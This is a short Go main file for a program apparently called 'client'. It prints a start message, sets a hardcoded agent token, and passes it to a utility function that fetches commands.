package main

import (
	"client/utils"
	"fmt"
)

func main() {
	fmt.Println("[§] Starting... [§]")
	// token := utils.GetAgentId()
	var token string = "35822daa-243f-4e95-ae0e-3fba016a1f5a"
	fmt.Println("Token : " + token)
	utils.GetCommand(token)
}
